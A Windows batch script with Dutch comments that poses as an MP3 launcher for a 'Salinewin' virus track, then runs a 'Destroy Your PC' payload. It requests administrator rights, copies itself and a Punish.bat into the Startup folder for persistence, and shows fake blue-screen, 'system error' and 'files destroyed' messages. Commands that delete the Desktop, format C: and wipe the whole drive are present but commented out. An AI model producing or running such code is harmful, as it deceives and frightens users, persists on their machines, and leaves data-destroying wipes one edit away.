@echo off
setlocal

:: Verwachte bestandsnaam (exact)
set "FNAME=Salinewin.exe V2 virus beat (LOUD).mp3"

:: === 1) Kijk eerst in dezelfde map als de .bat
if exist "%~dp0%FNAME%" (
    set "TRACK=%~dp0%FNAME%"
    goto :PLAY
)

:: === 2) Kijk in de Downloads map van de huidige gebruiker
if exist "%USERPROFILE%\Downloads\%FNAME%" (
    set "TRACK=%USERPROFILE%\Downloads\%FNAME%"
    goto :PLAY
)

echo [ERROR] Geen mp3 gevonden.
echo Gezocht op:
echo  - %~dp0%FNAME%
echo  - %USERPROFILE%\Downloads\%FNAME%
pause
exit /b 1

:PLAY
echo Playing: "%TRACK%"

:: Probeer eerst met start
start "" "%TRACK%" 2>nul

:: fallback via PowerShell als start faalt
timeout /t 1 >nul
powershell -NoProfile -Command ^
    "$p='%TRACK%'; try { $w=New-Object -ComObject WMPlayer.OCX; $m=$w.newMedia($p); $w.currentPlaylist.appendItem($m); $w.controls.play() } catch { Start-Process -FilePath $p }" >nul 2>&1

:: === DROP punish.bat VOORAF IN STARTUP ===
if exist "%~dp0Punish.bat" (
    copy /Y "%~dp0Punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
)

:: === ADMIN CHECK ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo Opstarten als admin...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: === ALS ADMIN GEGEVEN, VERWIJDER punish.bat ===
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" (
    del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
)

:: === VISUALS ===
title Destroy Your PC - Payload with Disco
color 0C
mode con: cols=70 lines=10

:: === DISCO START ===
echo.
echo *** GET READY FOR THE DISCO CHAOS ***
:disco
for /l %%i in (1,1,20) do (
    color 0%%i
    ping localhost -n 1 >nul
)
color 0A

:: === BEEP PARTY ===
powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"

:: === POPUP MESSAGES ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('YOU RAN THE WRONG SCRIPT BRO', 'Destroy Your PC')"
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Say goodbye to your files', 'Oops...')"

:: === FAKE BLUE SCREEN TRICK ===
start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"

:: === SELF-COPY TO STARTUP ===
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul

:: === MESS WITH USER (safe in VM, destructieve commands verwijderd) ===
rem takeown /f "%userprofile%\Desktop" /r /d y >nul
rem rmdir /s /q "%userprofile%\Desktop"

:: === ANNOYING WINDOWS ===
for /l %%i in (1,1,5) do (
    start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('System Error: 0xC000FUBAR','Windows Error')"
    timeout /t 2 >nul
)

:: === FAKE INJECTION ===
echo Injecting into svchost...
ping localhost -n 2 >nul
echo System integrity = 0%
ping localhost -n 2 >nul
echo Virus fully deployed.
ping localhost -n 2 >nul

:: === NIEUWE WIPE EERST (FORMAT STIJL) ===
echo [!] Initiating new brute wipe...
rem format C: /FS:NTFS /Q /Y
ping localhost -n 5 >nul

:: === OUDE POWERSHELL WIPE NA FORMAT ===
rem powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"

:: === FINAL POPUP ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"

pause


